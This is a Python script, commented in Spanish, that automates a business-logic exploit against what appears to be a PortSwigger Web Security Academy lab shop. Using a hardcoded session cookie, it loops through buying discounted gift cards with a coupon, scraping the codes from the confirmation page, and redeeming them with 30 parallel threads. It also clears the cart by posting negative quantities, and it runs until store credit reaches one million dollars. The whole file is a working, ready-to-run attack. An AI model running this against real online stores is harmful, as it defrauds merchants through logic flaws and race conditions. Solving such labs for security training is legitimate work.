import requests
import re
import math
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

# ── Configuración ──────────────────────────────────────────────────────────────
HOST           = "0afc00f704cce8a38037e50a000f0024.web-security-academy.net"
BASE_URL       = f"https://{HOST}"
SESSION_COOKIE = "f7bzlh2cmpsh8I0xw0P8lG9GU1U9tRFD"
GIFT_CARD_PRICE     = 10.0
DISCOUNT_RATE       = 0.30
PRICE_WITH_DISCOUNT = GIFT_CARD_PRICE * (1 - DISCOUNT_RATE)  # $7.00
TARGET_CREDIT       = 1_000_000.0
MAX_PER_ORDER       = 99

# ── Configuración de concurrencia ──────────────────────────────────────────────
PURCHASE_THREADS = 1
REDEEM_THREADS   = 30

# ── Fábrica de sesiones ────────────────────────────────────────────────────────
def make_session():
    s = requests.Session()
    s.cookies.set("session", SESSION_COOKIE, domain=HOST)
    s.headers.update({
        "Host":         HOST,
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent":   "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                        "(KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
    })
    return s

main_session = make_session()

# ── Helpers ────────────────────────────────────────────────────────────────────
def get_csrf(s, path="/cart"):
    r = s.get(f"{BASE_URL}{path}")
    m = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    if not m:
        raise ValueError(f"No se encontró token CSRF en {path}")
    return m.group(1)

def get_store_credit(s=None):
    if s is None:
        s = main_session
    r = s.get(BASE_URL)
    m = re.search(r'Store credit:\s*\$([0-9]+(?:\.[0-9]+)?)', r.text)
    if not m:
        raise ValueError("No se pudo extraer el store credit")
    return float(m.group(1))

def cards_to_buy(store_credit):
    affordable = math.floor(store_credit / PRICE_WITH_DISCOUNT)
    return min(affordable, MAX_PER_ORDER)

def force_empty_cart(s, thread_id):
    """
    Vacía el carrito enviando -1 repetidamente hasta que no haya items.
    Usa el mismo mecanismo que el botón Remove del frontend.
    """
    for attempt in range(150):  # máximo 99 unidades + margen
        r = s.get(f"{BASE_URL}/cart")
        # Si no hay items en el carrito, el botón Remove no aparece
        if 'name="productId"' not in r.text:
            print(f"  [T{thread_id:02d}] Carrito vacío ({attempt} removes)")
            return True
        # Extraer todos los productId presentes
        product_ids = re.findall(
            r'<input required type=hidden name=productId value=(\d+)>',
            r.text
        )
        if not product_ids:
            return True
        # Enviar Remove (-1) para cada producto encontrado
        for pid in set(product_ids):
            s.post(f"{BASE_URL}/cart", data={
                "productId": pid,
                "redir":     "CART",
                "quantity":  "-1",
            }, allow_redirects=True)
    print(f"  [T{thread_id:02d}] ADVERTENCIA: carrito no quedó vacío tras 150 intentos")
    return False

# ── Ciclo completo de compra ───────────────────────────────────────────────────
def purchase_cycle(thread_id, n_cards):
    """
    Cada hilo usa su propia sesión HTTP (misma cookie = mismo carrito en servidor).
    Por eso primero se vacía el carrito, luego se agrega exactamente n_cards.
    """
    s = make_session()
    try:
        # 1. Vaciar carrito antes de empezar
        print(f"  [T{thread_id:02d}] Vaciando carrito...")
        force_empty_cart(s, thread_id)

        # 2. Agregar exactamente n_cards
        print(f"  [T{thread_id:02d}] Agregando {n_cards} tarjeta(s)...")
        r = s.post(f"{BASE_URL}/cart", data={
            "productId": "2",
            "redir":     "PRODUCT",
            "quantity":  str(n_cards),
        }, allow_redirects=True)

        # 3. Verificar que el carrito tiene la cantidad correcta
        r = s.get(f"{BASE_URL}/cart")
        qty_match = re.search(r'<button[^>]*>-</button>\s*(\d+)', r.text)
        actual_qty = int(qty_match.group(1)) if qty_match else 0
        if actual_qty != n_cards:
            print(f"  [T{thread_id:02d}] AVISO: carrito tiene {actual_qty}, esperaba {n_cards}")

        # 4. Aplicar cupón
        csrf = get_csrf(s, "/cart")
        s.post(f"{BASE_URL}/cart/coupon", data={
            "csrf":   csrf,
            "coupon": "SIGNUP30",
        }, allow_redirects=True)

        # 5. Checkout — capturar 303
        csrf = get_csrf(s, "/cart")
        r = s.post(
            f"{BASE_URL}/cart/checkout",
            data={"csrf": csrf},
            allow_redirects=False,
        )

        if r.status_code != 303:
            print(f"  [T{thread_id:02d}] ERROR checkout: {r.status_code}")
            print(r.text[:300])
            return []

        location = r.headers.get("Location", "")
        confirm_url = f"{BASE_URL}{location}" if location.startswith("/") else location

        # 6. GET confirmación
        r = s.get(confirm_url)

        # 7. Extraer solo la tabla is-table-numbers
        block = re.search(
            r'<table class=is-table-numbers>.*?</table>',
            r.text, re.DOTALL
        )
        if not block:
            print(f"  [T{thread_id:02d}] ERROR: tabla de códigos no encontrada")
            return []

        codes = re.findall(r'<td>([A-Za-z0-9]{10})</td>', block.group())
        print(f"  [T{thread_id:02d}] ✓ {len(codes)} código(s) extraído(s)")
        return codes

    except Exception as e:
        print(f"  [T{thread_id:02d}] Excepción: {e}")
        return []

# ── Canje de una tarjeta ───────────────────────────────────────────────────────
def redeem_card(args):
    code, thread_id, stop_event, ok_counter, target = args
    # Si ya se alcanzó el objetivo, no hacer la petición
    if stop_event.is_set():
        return 400
    s = make_session()
    try:
        csrf = get_csrf(s, "/my-account")
        r = s.post(f"{BASE_URL}/gift-card", data={
            "csrf":      csrf,
            "gift-card": code,
        }, allow_redirects=True)
        if r.status_code in (200, 302):
            with ok_counter[0]:
                ok_counter[1] += 1
                current = ok_counter[1]
            print(f"    [✓][T{thread_id:02d}] {code}  →  HTTP {r.status_code}  ({current}/{target})")
            if current >= target:
                stop_event.set()
        elif r.status_code != 400:
            print(f"    [?][T{thread_id:02d}] {code}  →  HTTP {r.status_code}")
        return r.status_code
    except Exception as e:
        print(f"    [✗][T{thread_id:02d}] {code}  →  Error: {e}")
        return 0

# ══════════════════════════════════════════════════════════════════════════════
# LOOP PRINCIPAL
# ══════════════════════════════════════════════════════════════════════════════
iteration = 0

while True:
    iteration += 1
    store_credit = get_store_credit()

    print(f"\n{'='*60}")
    print(f"  Iteración #{iteration}  |  Store credit: ${store_credit:.2f}")
    print(f"{'='*60}")

    if store_credit >= TARGET_CREDIT:
        print(f"\n🎉 Objetivo alcanzado! Saldo final: ${store_credit:.2f}")
        break

    n_cards = cards_to_buy(store_credit)
    if n_cards < 1:
        print("  ERROR: Saldo insuficiente.")
        break

    capped = n_cards == MAX_PER_ORDER
    print(f"  Unidades por orden: {n_cards}  {'(cap máximo)' if capped else '(ajustado al saldo)'}")
    print(f"  Costo por orden   : ${n_cards * PRICE_WITH_DISCOUNT:.2f}")

    # ── Fase 1: Compras en paralelo ────────────────────────────────────────────
    print(f"\n[*] Fase compra — {PURCHASE_THREADS} hilo(s) x {n_cards} tarjetas c/u...")
    all_codes = []

    with ThreadPoolExecutor(max_workers=PURCHASE_THREADS) as executor:
        futures = {
            executor.submit(purchase_cycle, tid + 1, n_cards): tid
            for tid in range(PURCHASE_THREADS)
        }
        for future in as_completed(futures):
            codes = future.result()
            all_codes.extend(codes)

    if not all_codes:
        print("  No se obtuvieron códigos — reintentando en 2s...")
        time.sleep(2)
        continue


    # ── Fase 2: Canje en paralelo con early-stop ─────────────────────────────
    print(f"[*] Fase canje — {REDEEM_THREADS} hilo(s) en paralelo...")
    stop_event = threading.Event()
    ok_counter = [threading.Lock(), 0]   # [lock, count]
    target     = n_cards                 # parar al alcanzar n_cards canjes OK

    tasks = [
        (code, i % REDEEM_THREADS + 1, stop_event, ok_counter, target)
        for i, code in enumerate(all_codes)
    ]

    with ThreadPoolExecutor(max_workers=REDEEM_THREADS) as executor:
        futures = [executor.submit(redeem_card, t) for t in tasks]
        results = [f.result() for f in futures]

    ok_count   = sum(1 for r in results if r in (200, 302))
    skip_count = sum(1 for r in results if r == 400)
    print(f"  Canjeados: {ok_count} ✓  |  Descartados (400): {skip_count} ✗")

    # ── Resultado ──────────────────────────────────────────────────────────────
    new_credit = get_store_credit()
    ganancia   = new_credit - store_credit
    print(f"\n  Saldo anterior : ${store_credit:.2f}")
    print(f"  Saldo actual   : ${new_credit:.2f}")
    print(f"  Ganancia neta  : ${ganancia:+.2f}")

print("\n[*] Script finalizado.")
